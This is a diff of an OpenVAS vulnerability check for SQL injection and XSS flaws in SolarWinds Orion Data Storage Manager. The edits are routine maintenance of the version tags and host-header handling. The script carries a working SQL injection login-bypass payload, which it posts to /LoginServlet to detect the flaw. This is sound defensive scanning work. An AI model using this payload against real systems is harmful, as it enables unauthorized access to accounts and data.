@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_solarwinds_orion_storage_manager_mult_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: secpod_solarwinds_orion_storage_manager_mult_vuln.nasl 11429 2018-09-17 10:08:59Z cfischer $
 #
 # SolarWinds Orion Data Storage Manager SQL Injection and XSS Vulnerabilities
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902902");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11429 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 12:08:59 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-01-24 11:53:50 +0530 (Tue, 24 Jan 2012)");
   script_name("SolarWinds Orion Data Storage Manager SQL Injection and XSS Vulnerabilities");
   script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521328");
@@ -42,6 +42,8 @@ if(description)
   script_family("Web application abuses");
   script_require_ports("Services/www", 9000);
   script_dependencies("find_service.nasl", "http_version.nasl");
+  script_exclude_keys("Settings/disable_cgi_scanning");
+
   script_tag(name:"insight", value:"Multiple flaws are due to an,
 
   - Input passed via the 'loginName' and 'password' parameters to
@@ -73,13 +75,8 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 dsmPort = get_http_port(default:9000);
-if(!dsmPort){
-  dsmPort = 9000;
-}
 
-if(!get_port_state(dsmPort)){
-  exit(0);
-}
+host = http_host_name(port:dsmPort);
 
 sndReq = http_get(item:"/LoginServlet", port:dsmPort);
 rcvRes = http_send_recv(port:dsmPort, data:sndReq);
@@ -92,7 +89,7 @@ exploit = "loginState=checkLogin&loginName=%27+or+%27bug%27%3D" +
           "%27bug%27+%23&password=%27+or+%27bug%27%3D%27bug%27+%23";
 
 sndReq = string("POST /LoginServlet HTTP/1.1\r\n",
-                "Host: ", get_host_name(), "\r\n",
+                "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(exploit), "\r\n\r\n",
                  exploit);
